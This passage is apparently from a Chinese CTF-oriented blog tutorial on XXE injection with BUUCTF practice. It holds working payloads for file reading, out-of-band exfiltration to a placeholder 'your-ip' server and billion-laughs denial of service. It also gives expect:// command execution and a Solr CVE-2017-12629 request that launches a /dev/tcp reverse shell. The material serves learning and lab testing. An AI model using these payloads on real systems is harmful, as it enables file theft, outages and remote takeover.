<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 104</span><br><span class="line">Origin: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">root</span>&gt;</span> <span class="tag">&lt;<span class="name">username</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">username</span>&gt;</span> <span class="tag">&lt;<span class="name">password</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">password</span>&gt;</span> <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>更改数据包，拿到flag</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: 3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/plain;charset=UTF-8</span><br><span class="line">Content-Length: 169</span><br><span class="line">Origin: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://3096e446-29bb-4deb-9712-c35861a41947.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    ]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">password</span>&gt;</span>bbbb<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="无回显，暂未实测"><a href="#无回显，暂未实测" class="headerlink" title="无回显，暂未实测"></a>无回显，暂未实测</h3><p>本次测试用的phpStudy，需开启apache日志记录并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=目标文件路径&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://your-ip/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>远程服务器部署evil.xml内容为:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">payload</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://your-ip/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</span><br></pre></td></tr></table></figure>
<h2 id="危害2-拒绝服务攻击"><a href="#危害2-拒绝服务攻击" class="headerlink" title="危害2.拒绝服务攻击"></a>危害2.拒绝服务攻击</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line">   <span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   <span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">   ]&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="危害3-远程命令-代码-执行"><a href="#危害3-远程命令-代码-执行" class="headerlink" title="危害3.远程命令(代码)执行"></a>危害3.远程命令(代码)执行</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
<h2 id="危害4-内网信息探测"><a href="#危害4-内网信息探测" class="headerlink" title="危害4.内网信息探测"></a>危害4.内网信息探测</h2><p>　　利用http协议<a target="_blank" rel="noopener" href="http://url/file.ext%EF%BC%8C%E6%9B%BF%E6%8D%A2%E6%A0%87%E5%87%86poc%E4%B8%AD%E7%9B%B8%E5%BA%94%E9%83%A8%E5%88%86%E5%8D%B3%E5%8F%AF,%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%E6%AF%94%E8%BE%83%E4%B8%8D%E7%A8%B3%E5%AE%9A%EF%BC%8C%E6%A0%B9%E6%8D%AE%E4%B8%8D%E5%90%8Cxml%E8%A7%A3%E6%9E%90%E5%99%A8%E4%BC%9A%E5%BE%97%E5%88%B0%E4%B8%8D%E5%90%8C%E7%9A%84%E5%9B%9E%E6%98%BE%E6%8A%A5%E9%94%99%E7%BB%93%E6%9E%9C%E3%80%82">http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</a></p>
<p>payload：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE ANY [
&lt;!ENTITY test SYSTEM &quot;http://127.0.0.1:87/tets.txt&quot;&gt;
]&gt;
&lt;abc&gt;&amp;test;&lt;/abc&gt;
</code></pre>
<h2 id="危害5-攻击内网网站"><a href="#危害5-攻击内网网站" class="headerlink" title="危害5.攻击内网网站"></a>危害5.攻击内网网站</h2><p>待补</p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="buuctf-PHP-XXE"><a href="#buuctf-PHP-XXE" class="headerlink" title="buuctf [PHP]XXE"></a>buuctf [PHP]XXE</h2><p>看到Libxml版本低于2.9，可能存在XXE漏洞<br>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /simplexml_load_string.php HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:29652</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cache: no-cache</span><br><span class="line">Origin: moz-extension://7448e4bf-6a1b-41a0-ab99-80010feb71a6</span><br><span class="line">Content-Length: 199</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Solr-CVE-2017-12629-RCE"><a href="#Solr-CVE-2017-12629-RCE" class="headerlink" title="[Solr]CVE-2017-12629-RCE"></a>[Solr]CVE-2017-12629-RCE</h2><p>仅贴利用报文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: node4.buuoj.cn:25528</span><br><span class="line">Content-Length: 239</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;add-listener&quot;:&#123;</span><br><span class="line">    &quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher1&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;echo BASE64SHELL|base64 -d|bash -i&quot;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其中BASE64SHELL为下列语句的base64加密<br><code>bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1</code></p>
<p>这里换成其他的反弹shell都可以，但要注意base64编码 </p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/181064.html">XXE(XML External Entity attack)XML外部实体注入攻击</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/191346829">反弹shell的各种姿势</a><br><a target="_blank" rel="noopener" href="https://www.whcsrl.com/blog/10541">Apache Solr 远程命令执行漏洞（CVE-2017-12629）</a><br><a target="_blank" rel="noopener" href="https://green-m.me/2019/11/06/encrypt-reverse-shell/#0x03-base64base32hex-%E7%BC%96%E7%A0%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell">对基础 shell 进行流量混淆</a><br><a target="_blank" rel="noopener" href="https://forum.ywhack.com/reverse-shell/">反弹Shell命令一键生成</a><br><a target="_blank" rel="noopener" href="http://www.hackdig.com/08/hack-446221.htm">反弹Shell命令一键生成汇总</a><br><a target="_blank" rel="noopener" href="https://chowdera.com/2022/02/202202191957090774.html#_49">CVE-2017-12629）Apache Solr RCE命令执行漏洞复现</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/solr/CVE-2017-12629-RCE/README.md">vulhub  Apache Solr 远程命令执行漏洞（CVE-2017-12629）</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/151944">从XML到RCE（远程代码执行）</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36241198/article/details/114778393">buuctf [PHP]XXE</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a>  </p>

  </div>
</article>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">文章</a></li>
         
          <li><a href="/tags/">分类</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXXE%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是XXE漏洞？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">原理是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XML-%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="toc-number">3.</span> <span class="toc-text">XML 简单了解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DTD%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3"><span class="toc-number">4.</span> <span class="toc-text">DTD简单了解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E4%BD%93%E5%88%86%E4%B8%BA%E4%B8%80%E8%88%AC%E5%AE%9E%E4%BD%93%E5%92%8C%E5%8F%82%E6%95%B0%E5%AE%9E%E4%BD%93"><span class="toc-number">4.1.</span> <span class="toc-text">实体分为一般实体和参数实体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DTD%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E%EF%BC%88%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-number">4.2.</span> <span class="toc-text">DTD实体声明（重点）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9E%84%E9%80%A0%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">5.</span> <span class="toc-text">如何构造外部实体注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">5.1.</span> <span class="toc-text">有回显</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD%E6%96%87%E6%A1%A3"><span class="toc-number">5.1.1.</span> <span class="toc-text">不引用外部DTD文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8DTD%E6%96%87%E6%A1%A3"><span class="toc-number">5.1.2.</span> <span class="toc-text">引用外部DTD文档</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">5.2.</span> <span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">6.</span> <span class="toc-text">XXE带来的危害</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B31-%E8%AF%BB%E5%8F%96%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">危害1.读取任意文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE-1"><span class="toc-number">6.1.1.</span> <span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%8C%E6%9A%82%E6%9C%AA%E5%AE%9E%E6%B5%8B"><span class="toc-number">6.1.2.</span> <span class="toc-text">无回显，暂未实测</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B32-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">6.2.</span> <span class="toc-text">危害2.拒绝服务攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B33-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81-%E6%89%A7%E8%A1%8C"><span class="toc-number">6.3.</span> <span class="toc-text">危害3.远程命令(代码)执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B34-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B"><span class="toc-number">6.4.</span> <span class="toc-text">危害4.内网信息探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B35-%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E7%BD%91%E7%AB%99"><span class="toc-number">6.5.</span> <span class="toc-text">危害5.攻击内网网站</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">7.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#buuctf-PHP-XXE"><span class="toc-number">7.1.</span> <span class="toc-text">buuctf [PHP]XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solr-CVE-2017-12629-RCE"><span class="toc-number">7.2.</span> <span class="toc-text">[Solr]CVE-2017-12629-RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&text=XXE漏洞初探及简单实战"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&is_video=false&description=XXE漏洞初探及简单实战"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XXE漏洞初探及简单实战&body=Check out this article: http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&title=XXE漏洞初探及简单实战"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&name=XXE漏洞初探及简单实战&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/04/15/XXE%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2%E5%8F%8A%E7%AE%80%E5%8D%95%E5%AE%9E%E6%88%98/&t=XXE漏洞初探及简单实战"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    Imp1ture
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">文章</a></li><!--
     --><!--
       --><li><a href="/tags/">分类</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
